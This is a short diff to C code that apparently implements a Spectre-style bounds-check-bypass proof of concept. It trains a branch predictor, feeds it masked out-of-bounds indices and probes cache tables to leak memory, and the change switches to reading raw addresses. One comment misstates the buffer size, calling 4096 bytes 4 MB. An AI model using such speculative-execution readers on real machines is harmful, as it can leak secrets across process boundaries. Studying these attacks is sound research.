@@ -7,7 +7,7 @@ typedef unsigned char byte;
 extern void _log(unsigned argument);
 extern unsigned probeTable(byte* probe_table_address);
 
-byte secret_table[1];
+byte secret_table[4 << 10]; // 4 MB for verfication purposes
 
 byte junk = 0;
 
@@ -19,14 +19,13 @@ unsigned TRAINING_CONSTANT = 10;
 unsigned training_counter = 0;
 
 byte speculativelyReadAddress(unsigned address, unsigned repetitions, unsigned page_size, unsigned probe_length) {
-    unsigned index = address - (unsigned) secret_table;
     byte* valid_access_indicator_array = (byte*) malloc(repetitions * TRAINING_CONSTANT * page_size);
     // one valid-dummy space for each iteration (inefficient but simple)
     byte* probe_tables = (byte*) malloc((repetitions * probe_length + 1) * page_size);
     training_counter = 0;
     for (unsigned i = 0; i < repetitions * TRAINING_CONSTANT; ++i) {
         const byte invalid_access = !((i + 1) % TRAINING_CONSTANT);
-        const unsigned fixed_index = index & -invalid_access;
+        const unsigned fixed_index = address & -invalid_access;
         // load condition from RAM so speculative execution gets triggered
         // _log(fixed_index);
         if (~valid_access_indicator_array[i * page_size] & !invalid_access) {
